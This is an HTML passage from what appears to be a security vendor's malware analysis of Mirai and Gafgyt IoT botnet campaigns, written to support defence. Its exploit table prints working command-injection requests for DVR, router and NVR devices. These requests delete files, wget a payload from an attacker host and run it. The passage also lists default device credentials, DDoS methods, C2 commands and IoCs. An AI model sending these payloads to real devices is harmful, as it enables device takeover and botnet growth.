<td style="width: 147px;"><a href="https://www.exploit-db.com/exploits/41471/">JAWS Webserver unauthenticated shell command execution</a></td>
<td style="width: 106px;">MVPower DVRs, among others</td>
<td style="width: 741px;">GET /shell?cd+/tmp;rm+-rf+*;wget+http://%s/jaws;sh+/tmp/jaws</td>
</tr>
<tr>
<td style="width: 147px;"><a href="https://www.exploit-db.com/exploits/28333/">UPnP SOAP TelnetD Command Execution</a></td>
<td style="width: 106px;">D-Link devices</td>
<td style="width: 741px;">POST /soap.cgi?service=WANIPConn1<br />
&lt;?xml version="1.0" ?&gt;&lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"&gt;&lt;SOAP-ENV:Body&gt;&lt;m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"&gt;&lt;NewPortMappingDescription&gt;&lt;NewPortMappingDescription&gt;&lt;NewLeaseDuration&gt;&lt;/NewLeaseDuration&gt;&lt;NewInternalClient&gt;<code>cd /tmp;rm -rf *;wget http://%s/dlink;sh /tmp/dlink</code>&lt;/NewInternalClient&gt;&lt;NewEnabled&gt;1&lt;/NewEnabled&gt;&lt;NewExternalPort&gt;634&lt;/NewExternalPort&gt;&lt;NewRemoteHost&gt;&lt;/NewRemoteHost&gt;&lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt;&lt;NewInternalPort&gt;45&lt;/NewInternalPort&gt;&lt;/m:AddPortMapping&gt;&lt;SOAPENV:Body&gt;&lt;SOAPENV:envelope&gt;</td>
</tr>
<tr>
<td style="width: 147px;"><a href="https://www.exploit-db.com/exploits/41598/">Netgear cgi-bin Command Injection</a></td>
<td style="width: 106px;">Netgear R7000/R6400 devices</td>
<td style="width: 741px;">GET /cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://%s/netgear2;${IFS}sh${IFS}/var/tmp/netgear2</td>
</tr>
<tr>
<td style="width: 147px;"><a href="https://blogs.securiteam.com/index.php/archives/3445">Vacron NVR RCE</a></td>
<td style="width: 106px;">Vacron NVR devices</td>
<td style="width: 741px;">GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://%s/vacron;sh+/tmp/vacron</td>
</tr>
</tbody>
</table>
<p>All of these vulnerabilities are publicly known and have been exploited by different botnets either separately or in combination with others in the past, however, this is the first Mirai variant using all eleven of them together.<br />
<strong>Differentiating features of the campaign:</strong></p>
<ul>
<li>Two different encryption schemes: Aside from using the standard XOR encryption scheme seen in all Mirai variants, in this case using the table key 0xBAADF00D samples make use of a second key for the encryption of certain config strings.</li>
<li>Samples rely solely on exploits for propagation and don’t perform a credential brute-force attack.</li>
<li>Further infection of infected devices is prevented by dropping packets received on certain ports using iptables (Figure 1)</li>
</ul>
<p><img  class="aligncenter wp-image-83360 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_1.png" alt="Mirai_1" width="600" height="255" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_1.png 945w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_1-900x383.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_1-300x128.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_1-768x327.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_1-370x157.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 1: Screenshot from malware disassembly showing the use of iptables to drop future connection attempts via certain ports</em></p>
<p>The campaign makes use of the IP 213[.]183.53.120 both for serving payloads, and as a Command and Control (C2) server.<br />
Pivoting off this IP, I discovered some Gafgyt samples that surfaced around the same time reporting to the same IP, but using a new method named '<em>SendHTTPCloudflare</em>'. This method is detailed at the end of this blog post.<br />
This campaign was linked to the Omni variant on several references in the code as seen such as the one seen in Figure 2 below.</p>
<p><img  class="aligncenter wp-image-83318 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_2.png" alt="Mirai_2" width="600" height="57" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_2.png 939w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_2-900x85.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_2-300x28.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_2-768x73.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_2-370x35.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 2: OMNI reference in samples</em></p>
<p>The encrypted strings also reference a website gpon[.]party that was down at the time of this writing.<br />
<img  class="aligncenter wp-image-83279 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_3.png" alt="Mirai_3" width="600" height="68" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_3.png 939w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_3-900x102.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_3-300x34.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_3-768x87.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_3-370x42.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 3: gpon[.]party reference</em></p>
<p><span lang="EN-GB" style="font-family: Calibri, sans-serif; font-size: 18pt;">CAMPAIGN 2: Okane</span><br />
Samples from this campaign were served from the IP 46[.]243.189.101. This host briefly had an open directory containing the samples, as seen in the figure below.<br />
<img  class="size-full wp-image-83240 aligncenter lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_4.png" alt="Mirai_4" width="362" height="677" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_4.png 362w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_4-160x300.png 160w" sizes="(max-width: 362px) 100vw, 362px" /></p>
<p style="text-align: center;"><em>Figure 4: Screenshot from open directory at payload server 46[.]243.189.101</em></p>
<p>The payload source in this attack was located at hxxp://46[.]243.189.101/gang/. The downloaded payload is a shell script that attempts to replicate itself by downloading Okane binaries to vulnerable devices.  On the 13<sup>th</sup> of June, the payload source for some of these samples was briefly replaced with the Cloudflare DNS server 1[.]1.1.1.<br />
This campaign incorporates the same exploits listed in Table 1. Figure 5 shows these exploits being called sequentially in one of the samples belonging to this campaign. Each call results in the creation of a dedicated fork for each exploit.<br />
<img  class="size-full wp-image-83201 aligncenter lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_5.png" alt="Mirai_5" width="402" height="1125" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_5.png 402w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_5-107x300.png 107w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_5-366x1024.png 366w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_5-370x1035.png 370w" sizes="(max-width: 402px) 100vw, 402px" /></p>
<p style="text-align: center;"><em>Figure 5: Screenshot from malware disassembly of exploit calls in a sample from Campaign 2</em></p>
<p>Unlike the previous campaign, these samples also perform a credential brute force attack. Some unusual entries were discovered on the brute force lists in these samples, such as the following:</p>
<ul>
<li>root/t0talc0ntr0l4! - default credentials for <a href="https://open-sez.me/passwd-control4.htm">Control4</a> devices</li>
<li>admin/adc123 - default credentials for <a href="https://fccid.io/F8I-PSM0804A/User-Manual/Users-Manual-2-1600135.pdf">ADC FlexWave Prism</a> devices</li>
<li>mg3500/merlin - default credentials for <a href="https://seclists.org/bugtraq/2010/Nov/127">Camtron IP cameras</a></li>
</ul>
<p>Some samples belonging to this campaign include the addition of two new DDoS methods to the Mirai source code.<br />
Below are descriptions of these new DDoS methods, extracted from the following sample.</p>
<table align="center">
<tbody>
<tr>
<td width="66"><strong>SHA256</strong></td>
<td width="535">320ed65d955bdde8fb17a35024f7bd978d26c041de1ddcf8a592974f77d82401</td>
</tr>
</tbody>
</table>
<ul>
<li><strong>attack_method_tcpxmas: </strong>involves sending TCP packets with all flags set, also known as <a href="https://en.wikipedia.org/wiki/Christmas_tree_packet">Christmas tree packet</a> This could be considered a more effective means of DDoS since these packets <em>“require much more processing by routers and end-hosts than the "usual" packets do.” </em>This method has already been observed used by Gafgyt and Kaiten variants in the past. The payload size of packets sent is set to 768 bytes.</li>
<li><strong>attack_method_std: </strong>involves sending packets with a randomized payload of 1024 bytes.</li>
</ul>
<p>Digging deeper reveals that samples using these attack methods have been part of a Mirai code fork from as early as August 2017.<br />
Some newer samples from the same campaign also integrate additional methods that only appear in samples from the beginning of June 2018. Some notable methods are detailed below.<br />
For this analysis I used a sample with the following hash.</p>
<table align="center">
<tbody>
<tr>
<td width="66"><strong>SHA256</strong></td>
<td width="535">be1d722af56ba8a660218a8311c0482c5b2d096ba91485e7d9dfc12a2b8e00b3</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<ul>
<li><strong>attack_method_udpgame</strong>: UDP DDoS using SOCK_RAW from a random source port to the destination port 27015 (often used by online game servers).</li>
<li><strong>attack_method_asyn</strong>: TCP DDoS using packets with random source and destination ports, using packets with the ACK and SYN flags set.</li>
<li><strong>attack_method_tcpfrag</strong>: TCP DDoS using SOCK_RAW with random source and destination ports and sequence number, and flags URG, ACK, PSH, RST, SYN and FIN set. In this case the ‘Don’t Fragment’ bit is set to 1.</li>
<li><strong>attack_method_tcpall</strong>: same as <em>attack_method_tcpfrag </em>above, except the ‘Don’t Fragment’ bit is set to 0.</li>
<li><strong>attack_method_tcpusyn</strong>: TCP DDoS using packets with random source and destination ports, using packets with the URG and SYN flags set.</li>
</ul>
<p>On the 19th of June, samples on this server were stripped of their exploits and reverted to using a simple brute force and subsequently dropping a shell script, for self-propagation.</p>
<p><img  class="aligncenter wp-image-83162 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_6.png" alt="Mirai_6" width="600" height="101" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_6.png 939w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_6-900x151.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_6-300x50.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_6-768x129.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_6-370x62.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 6: Shell script used by newer Okane samples for self-propagation</em></p>
<p><span lang="EN-GB" style="font-family: Calibri, sans-serif; font-size: 18pt;">CAMPAIGN 3: Hakai</span><br />
Earlier samples belonging to this campaign use all the exploits detailed in Table 1, except for the UPnP SOAP TelnetD Command Execution exploit.  The payload source for this campaign was hxxp://hakaiboatnet[.]pw/m and the C2 server was 178[.]128.185.250. Samples make use of an encryption scheme similar to Mirai; unlike previous campaigns, they are built on the Gafgyt source code, which is also known as Bashlite, Lizkebab, Torlus or LizardStresser.<br />
Samples listen for the following commands:</p>
<table align="center">
<tbody>
<tr>
<td width="301"><strong>Command</strong></td>
<td width="301"><strong>Translation</strong></td>
</tr>
<tr>
<td width="301">SC ON</td>
<td width="301">Scanner On</td>
</tr>
<tr>
<td width="301">SC OFF</td>
<td width="301">Scanner Off</td>
</tr>
<tr>
<td width="301">H</td>
<td width="301">HTTP Flood</td>
</tr>
<tr>
<td width="301">U</td>
<td width="301">UDP Flood</td>
</tr>
<tr>
<td width="301">S</td>
<td width="301">STD Flood</td>
</tr>
<tr>
<td width="301">T</td>
<td width="301">TCP Flood</td>
</tr>
<tr>
<td width="301">KT</td>
<td width="301">Kill scanner threads</td>
</tr>
</tbody>
</table>
<p>Newer samples from the same server were found to have also incorporated an OS Command Injection exploit against D-Link DSL-2750B devices. These samples use the same attack methods, encryption key and C2 as the samples above, however they source their payload from hxxp://178[.]128.185.250/e.</p>
<p><img  class="wp-image-83123 aligncenter lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_7.png" alt="Mirai_7" width="600" height="137" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_7.png 939w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_7-900x205.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_7-300x68.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_7-768x175.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_7-370x84.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 7: Exploit targeting D-Link DSL-2750B devices used in newer samples of the campaign</em></p>
<p><span style="font-size: 18pt;">Summary</span><br />
Table 2 shows a comparative summary of the three campaigns</p>
<table style="width: 1008px;" align="center">
<tbody>
<tr>
<td style="width: 85px;"><strong>Campaign</strong></td>
<td style="width: 86px;"><strong>Exploits Used</strong></td>
<td style="width: 64px;"><strong>Built on</strong></td>
<td style="width: 225px;"><strong>Payload source</strong></td>
<td style="width: 163px;"><strong>C2</strong></td>
<td style="width: 189px;"><strong>Config string encryption/decryption key</strong></td>
<td style="width: 150px;"><strong>Also brute forces credentials?</strong></td>
</tr>
<tr>
<td style="width: 85px;">1: Evolution of OMNI</td>
<td style="width: 86px;">All exploits in Table 1</td>
<td style="width: 64px;">Mirai</td>
<td style="width: 225px;">hxxp://213[.]183.53.120</td>
<td style="width: 163px;">213[.]183.53.120</td>
<td style="width: 189px;">Two different keys used – 0xBAADF00D, 0xDEADBEEF (or the equivalent of a byte-wise XOR with 0x22)</td>
<td style="width: 150px;">No</td>
</tr>
<tr>
<td style="width: 85px;">2: Okane</td>
<td style="width: 86px;">All exploits in Table 1</td>
<td style="width: 64px;">Mirai</td>
<td style="width: 225px;">hxxp://46[.]243.189.101/gang/</td>
<td style="width: 163px;">142[.]129.169.83:5888</td>
<td style="width: 189px;">0xDEACFBEF</td>
<td style="width: 150px;">Yes</td>
</tr>
<tr>
<td style="width: 85px;">3: Hakai</td>
<td style="width: 86px;">All exploits in Table 1, except UPnP SOAP TelnetD Command Execution. Newer samples also incorporate a D-Link DSL-2750B OS Command Injection exploit</td>
<td style="width: 64px;">Gafgyt</td>
<td style="width: 225px;">hxxp://hakaiboatnet[.]pw/m,<br />
hxxp:// 178[.]128.185.250/e</td>
<td style="width: 163px;">178[.]128.185.250</td>
<td style="width: 189px;">0xDEDEFFBA</td>
<td style="width: 150px;">Yes</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><em>Table 2: Comparative summary of the attack campaigns</em></p>
<p><span style="font-size: 18pt;">Gafgyt with a new Layer-7 attack</span><br />
Layer-7 DDoS attacks targeting specific DDoS protection service vendors are not new and were already observed in the form of the <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/reigning-king-ip-camera-botnets-challengers/">DvrHelper</a> variant of Mirai.<br />
They have however not been observed used by Gafgyt samples until now. While pivoting on the C2 used by samples of Campaign 1, I came across some Gafgyt samples listening for an additional command called <em>HTTPCF</em>.<br />
When this command is received, the bot calls a function called <em>SendHTTPCloudflare</em> that does as its name suggests, targeting a URL path used mostly by sites protected by Cloudflare. The earliest samples observed using this attack were from the end of May 2018.<br />
<img  class="aligncenter wp-image-83084 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_8.png" alt="Mirai_8" width="600" height="69" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_8.png 939w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_8-900x104.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_8-300x35.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_8-768x88.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_8-370x43.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 8: URL format targeted by HTTPCF</em></p>
<p>Samples use the same IP i.e. 213[.]183.53.120 at port 8013 for C2 communication.<br />
They also make use of some unusual User-Agents (UA) as seen in Figure 9. All UAs found in these samples are listed in the appendix<br />
<img  class="aligncenter wp-image-83045 lozad"  data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_9.png" alt="Mirai_9" width="600" height="118" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_9.png 939w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_9-900x177.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_9-300x59.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_9-768x151.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/07/Mirai_9-370x73.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 9: Some unusual User Agents found in related Gafgyt samples</em></p>
<p style="tab-stops: 45.8pt 91.6pt 137.4pt 183.2pt 229.0pt 274.8pt 320.6pt 366.4pt 412.2pt 458.0pt 503.8pt 549.6pt 595.4pt 641.2pt 687.0pt 732.8pt;"><span lang="EN-GB" style="font-family: Calibri, sans-serif; font-size: 18pt;">Conclusion</span></p>
<p>The initial rise of botnets targeting embedded systems had brought to light the security risks from millions of Internet-connected devices configured with default credentials.<br />
The evolution of these botnets to the use of multiple exploits, be it IoT Reaper or the campaigns discussed here, shows how attackers can build enormous botnets consisting of different types of devices, all responding to the same C2 server. This is exacerbated by the speed of exploitation in the wild of newly released vulnerabilities and also highlights the need for security vendor reactivity in response to these disclosures, applicable to the subset of these devices that do fall under the protection of security devices. However, the onus is on device manufacturers to ensure their devices are easy to update, and that they deploy the updates in a timely manner.<br />
Palo Alto Networks customers benefit from the following protections against these attacks:<br />
AutoFocus customers can track these activities using individual exploit tags:</p>
<ul>
<li><a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2017-17215">CVE-2017-17215</a></li>
<li><a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.CVE-2014-8361">CVE-2014-8361</a></li>
<li><a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.DLinkOSInjection">DLinkOSInjection</a></li>
<li><a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.NetgearRCE">NetgearRCE</a></li>
<li><a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.VacronNVRRCE">VacronNVRRCE</a></li>
<li><a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.EirRCE">EirRCE</a></li>
<li><a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.GPONExploits">GPONExploits</a></li>
<li><a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.DLinkDSL2750BOSCmdInjection">DLinkDSL2750BOSCmdInjection</a></li>
</ul>
<p>AutoFocus customers can also use the following malware family tags :</p>
<ul>
<li><a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Gafgyt">Gafygt</a></li>
<li><a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.ELFMirai">ELFMirai</a></li>
</ul>
<p>WildFire detects all related samples with malicious verdicts.<br />
All exploits and IPs/URLs involved in these campaigns are blocked through Threat Prevention and PANDB.</p>
<p><span lang="EN-GB" style="font-family: Calibri, sans-serif; font-size: 18pt;">Indicators of Compromise</span></p>

</tr>
<tr>
<td width="601">dbdffabc13a70a41188900620569266b5774deb007e0ef6dc63ff16ce72b4595</td>
</tr>
<tr>
<td width="601">dcfae13f567ea01c872db539c5d89448ebde2debe46421eccf752d4e20298c58</td>
</tr>
<tr>
<td width="601">e0ddec27709ec513886a217009f55994ddf61f58887774d6403ec18d5612d9e6</td>
</tr>
<tr>
<td width="601">e8782c38fc7c148be589a3c44f915719378840ddbf709fd48932797609f8daf2</td>
</tr>
<tr>
<td width="601">ec1fdb298556406d75506a234562f60ae517569963a317741dd4bd90680fb4ad</td>

<td width="601">edf32e6317253a323c4e815485ff4b97c4e0af268be8d78c9c0e48ac87e52e55</td>
